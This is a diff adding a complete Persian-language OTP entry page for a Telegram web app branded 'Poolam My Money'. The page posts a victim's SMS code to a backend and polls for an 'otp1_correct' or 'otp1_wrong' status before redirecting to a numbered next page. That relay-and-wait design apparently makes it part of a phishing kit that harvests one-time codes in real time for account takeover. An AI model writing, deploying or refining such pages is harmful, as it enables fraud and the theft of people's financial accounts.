@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Poolam My Money - کد تأیید</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f8fafc; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Top Header Design matching the screenshot */
+        .top-header {
+            width: 100%;
+            background: linear-gradient(135deg, #f26522, #0072bc);
+            padding: 20px 20px 60px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        .back-arrow {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.2);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lock-icon-box {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            color: white;
+            font-size: 28px;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        /* Main Card Overlay */
+        .card { 
+            background: white; 
+            width: 100%; 
+            max-width: 480px; 
+            flex: 1;
+            margin-top: -20px; 
+            padding: 40px 24px; 
+            border-top-left-radius: 30px; 
+            border-top-right-radius: 30px; 
+            text-align: center; 
+            box-shadow: 0 -10px 25px rgba(242,101,34,0.12); 
+            box-sizing: border-box;
+        }
+
+        .instruction { 
+            color: #718096; 
+            font-size: 15px; 
+            line-height: 1.6;
+            margin-bottom: 30px; 
+        }
+
+        .otp-group { 
+            display: flex; 
+            justify-content: center; 
+            gap: 8px; 
+            margin-bottom: 10px; 
+            direction: ltr;
+        }
+
+        .otp-input { 
+            width: 45px; 
+            height: 55px; 
+            border: 1.5px solid #cbd5e0; 
+            border-radius: 12px; 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: bold; 
+            outline: none; 
+            color: #2d3748;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .otp-input:focus {
+            border-color: #f26522;
+            box-shadow: 0 0 0 3px rgba(242,101,34,0.15);
+        }
+
+        /* Paste Button Styling matching the photo */
+        .paste-container {
+            display: flex;
+            justify-content: flex-end;
+            max-width: 320px;
+            margin: 0 auto 30px;
+        }
+
+        .btn-paste {
+            background: none;
+            border: none;
+            color: #f26522;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 4px 8px;
+        }
+
+        .btn-verify { 
+            background-color: #e2e8f0; 
+            color: #a0aec0; 
+            border: none; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 14px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: not-allowed;
+            transition: background 0.2s;
+        }
+
+        .btn-verify.active { 
+            background: linear-gradient(135deg, #f26522, #ea580c); 
+            color: white; 
+            cursor: pointer; 
+            box-shadow: 0 4px 12px rgba(242,101,34,0.25);
+        }
+
+        #loadingSection { display: none; padding-top: 40px; }
+
+        #errorBox {
+            color: #e53e3e;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="top-header">
+    <div class="back-arrow" onclick="history.back()">←</div>
+    <div class="lock-icon-box">🔒</div>
+    <h1 class="header-title">وارد کردن کد</h1>
+</div>
+
+<div class="card" id="inputSection">
+    <p class="instruction" id="instructionText">لطفاً کد ۶ رقمی که به شماره شما پیامک (SMS) شده است را وارد کنید.</p>
+
+    <div id="errorBox"></div>
+
+    <div class="otp-group">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+    </div>
+
+    <div class="paste-container">
+        <button type="button" class="btn-paste" id="pasteBtn">جای‌گذاری (Paste)</button>
+    </div>
+
+    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
+        تأیید
+    </button>
+</div>
+
+<div class="card" id="loadingSection">
+    <p style="color: #4a5568; font-size: 16px; font-weight: 500;">لطفاً کمی منتظر بمانید...</p>
+</div>
+
+<script>
+const inputs = document.querySelectorAll('.otp-input');
+const verifyBtn = document.getElementById('verifyBtn');
+const inputSection = document.getElementById('inputSection');
+const loadingSection = document.getElementById('loadingSection');
+const errorBox = document.getElementById('errorBox');
+const pasteBtn = document.getElementById('pasteBtn');
+const instructionText = document.getElementById('instructionText');
+
+let isSubmitting = false;
+
+window.onload = () => {
+    window.Telegram?.WebApp?.ready();
+    window.Telegram?.WebApp?.expand();
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) {
+        errorBox.innerText = "نشست منقضی شده است. لطفاً دوباره وارد شوید.";
+        setTimeout(() => window.location.href = "/index.html", 1500);
+    } else {
+        instructionText.innerHTML = `لطفاً کد ۶ رقمی ارسال شده به شماره تلیفون ثبت‌شده شما<br><b>+93 ${phone}</b> از طریق پیامک (SMS) را وارد کنید.`;
+    }
+};
+
+// Clipboard Paste Functionality matching the photo button
+pasteBtn.addEventListener('click', async () => {
+    try {
+        const text = await navigator.clipboard.readText();
+        const digits = text.replace(/\D/g, '').split('');
+        inputs.forEach((input, index) => {
+            if (digits[index]) {
+                input.value = digits[index];
+            }
+        });
+        if (digits.length > 0) {
+            const focusIndex = Math.min(digits.length, inputs.length) - 1;
+            inputs[focusIndex].focus();
+        }
+        check();
+    } catch (err) {
+        console.error('Failed to read clipboard', err);
+    }
+});
+
+inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+        check();
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+function check() {
+    const filled = [...inputs].every(i => i.value.length === 1);
+    verifyBtn.disabled = !filled;
+    verifyBtn.classList.toggle('active', filled);
+}
+
+async function handleVerification() {
+    if (isSubmitting) return;
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) return;
+
+    let otp = "";
+    inputs.forEach(i => otp += i.value);
+
+    isSubmitting = true;
+
+    inputSection.style.display = "none";
+    loadingSection.style.display = "block";
+    errorBox.innerText = "";
+
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone, otp })
+        });
+
+        const poll = setInterval(async () => {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "otp1_correct") {
+                clearInterval(poll);
+                localStorage.setItem("phone", phone);
+                window.location.href = "/page9";
+            }
+
+            if (data.status === "otp1_wrong") {
+                clearInterval(poll);
+                errorBox.innerText = "❌ کد نادرست است، لطفاً کد صحیح را وارد کنید";
+                reset();
+            }
+
+        }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        reset();
+    }
+}
+
+function reset() {
+    isSubmitting = false;
+    loadingSection.style.display = "none";
+    inputSection.style.display = "block";
+    inputs.forEach(i => i.value = "");
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('active');
+}
+</script>
+
+</body>
+</html>
